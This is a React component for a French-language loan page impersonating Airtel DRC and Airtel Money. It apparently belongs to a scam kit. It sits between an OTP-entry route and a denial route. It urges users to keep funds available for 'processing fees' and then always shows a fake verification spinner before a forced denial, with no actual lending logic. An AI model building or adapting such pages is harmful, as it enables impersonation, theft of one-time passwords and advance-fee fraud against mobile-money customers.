import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const MIN_LOAN = 50;
const MAX_LOAN = 100_000;
const STEP = 50;
const INTEREST_RATE = 0.15; // 15% flat rate example

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [loanAmount, setLoanAmount] = useState(5000);
  const [isProcessing, setIsProcessing] = useState(false);

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setLoanAmount(Number(e.target.value));
  };

  const handleContinue = () => {
    localStorage.setItem('airtelLoanAmount', String(loanAmount));
    setIsProcessing(true);
    // Simulate processing before going to denied page
    setTimeout(() => {
      navigate('/airtel-denied');
    }, 2000); 
  };

  const formatUSD = (amount: number) => amount.toLocaleString('en-US');
  
  const interestAmount = loanAmount * INTEREST_RATE;
  const totalRepayment = loanAmount + interestAmount;
  const percent = ((loanAmount - MIN_LOAN) / (MAX_LOAN - MIN_LOAN)) * 100;

  return (
    <div className="page-wrapper">
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #DA1C1C; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
        .header-title { font-size: 22px; font-weight: 900; }
        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
        
        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
        .back-link { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #6B7280; margin-bottom: 20px; cursor: pointer; }
        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; line-height: 1.5; }
        
        .step-text { font-size: 14px; color: #4B5563; line-height: 1.6; margin-bottom: 16px; }
        
        .slider-container { margin: 32px 0; }
        .amount-display { font-size: 36px; font-weight: 900; color: #DA1C1C; text-align: center; margin-bottom: 16px; }
        .loan-slider { -webkit-appearance: none; width: 100%; height: 8px; border-radius: 4px; outline: none; cursor: pointer; }
        .loan-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #DA1C1C; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.3); cursor: pointer; }
        .slider-labels { display: flex; justify-content: space-between; font-size: 12px; color: #9CA3AF; font-weight: 600; margin-top: 12px; }
        
        .breakdown-box { background: #F9FAFB; border: 1px solid #E5E7EB; border-radius: 12px; padding: 16px; margin-bottom: 24px; }
        .breakdown-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
        .breakdown-row:last-child { margin-bottom: 0; font-weight: 800; color: #1a1a1a; padding-top: 8px; border-top: 1px dashed #D1D5DB; }
        .breakdown-label { color: #6B7280; }
        
        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; background: #F87171; color: #1a1a1a; }
        .btn:active { background: #EF4444; }
        
        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
        
        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
        .spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
        .spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
        .spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; } .spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
        .spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; } .spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
        .spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; } .spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
        .spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; } .spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
        .spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; } .spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; } .spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
      `}</style>

      {isProcessing && (
        <div className="overlay">
          <div className="spinner-box">
            <div className="spinner">
              <div></div><div></div><div></div><div></div><div></div><div></div>
              <div></div><div></div><div></div><div></div><div></div><div></div>
            </div>
            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Traitement en cours...</h2>
            <p style={{fontSize: '14px', color: '#6B7280'}}>Veuillez patienter pendant que nous vérifions votre demande de prêt...</p>
          </div>
        </div>
      )}

      <div className="header-top">
        <div className="menu-icon">≡</div>
        <h1 className="header-title">Airtel DRC</h1>
      </div>
      <p className="header-sub">Prêts rapides. A tout moment. N'importe où.</p>

      <div className="card">
        <div className="back-link" onClick={() => navigate('/airtel-otp')}>← Retour</div>
        
        <h2 className="card-title">Votre demande de prêt</h2>
        <p className="card-sub">Voici les étapes pour obtenir votre prêt :</p>

        <div className="step-text">
          1. Assurez-vous que votre compte Airtel dispose de fonds suffisants pour couvrir les frais de traitement. Sinon, veuillez effectuer un dépôt.<br/><br/>
          2. Sélectionnez le montant du prêt souhaité ci-dessous. Un taux d'intérêt de <b>15 %</b> sera appliqué au principal.<br/><br/>
          <b>Remarque :</b> Aucun montant ne sera déduit avant la réception de votre prêt.
        </div>

        <div className="slider-container">
          <div className="amount-display">$ {formatUSD(loanAmount)}</div>
          <input 
            type="range" 
            min={MIN_LOAN} 
            max={MAX_LOAN} 
            step={STEP} 
            value={loanAmount} 
            onChange={handleSliderChange} 
            className="loan-slider"
            style={{ background: `linear-gradient(to right, #DA1C1C ${percent}%, #E5E7EB ${percent}%)` }}
          />
          <div className="slider-labels">
            <span>$ 50</span>
            <span>$ 100 000</span>
          </div>
        </div>

        <div className="breakdown-box">
          <div className="breakdown-row">
            <span className="breakdown-label">Montant principal</span>
            <span>$ {formatUSD(loanAmount)}</span>
          </div>
          <div className="breakdown-row">
            <span className="breakdown-label">Intérêt (15%)</span>
            <span>$ {formatUSD(interestAmount)}</span>
          </div>
          <div className="breakdown-row">
            <span>Remboursement total</span>
            <span>$ {formatUSD(totalRepayment)}</span>
          </div>
        </div>

        <button className="btn" onClick={handleContinue}>
          Continuer pour obtenir le prêt →
        </button>
      </div>

      <div className="bottom-brands">
        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
        <div className="brand-icon" style={{color: '#1E293B'}}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
        </div>
        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>$</div>
      </div>
    </div>
  );
}

export default AirtelLoanLimit;